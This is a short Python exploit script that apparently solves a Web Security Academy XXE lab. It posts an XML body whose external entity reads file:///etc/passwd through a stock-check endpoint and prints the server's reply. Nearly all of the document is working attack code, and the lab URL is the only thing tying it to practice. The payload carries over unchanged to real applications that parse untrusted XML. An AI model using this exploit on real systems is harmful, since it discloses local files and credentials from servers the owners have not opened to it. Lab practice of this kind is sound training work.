import requests

# Configuration
BASE_URL = "https://0a5800d304b373b4804a3f3000b9003a.web-security-academy.net/"

def execute_xxe_exploit(url):
    """Exploits an XXE vulnerability to retrieve local file contents."""
    stock_endpoint = f"{url}product/stock"
    
    # 1. Execution Phase
    print("[*] Transmitting malicious XXE payload targeting /etc/passwd...")
    
    # Formatted for readability without breaking XML structure
    xml_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
        '<stockCheck>'
        '<productId>&xxe;</productId>'
        '<storeId>1</storeId>'
        '</stockCheck>'
    )
    
    # Transmitting the raw XML string
    response = requests.post(stock_endpoint, data=xml_payload)
    
    # 2. Verification Phase
    print("[*] Verifying execution status...")
    verification_response = requests.get(url)
    
    if "Congratulations" in verification_response.text:
        print("[+] TARGET SECURED: EXPLOIT SUCCESSFUL\n")
        print("[*] Extracted Data:")
        print(response.text.strip())
    else:
        print("[-] Exploit failed or verification string not found.")

if __name__ == "__main__":
    execute_xxe_exploit(BASE_URL)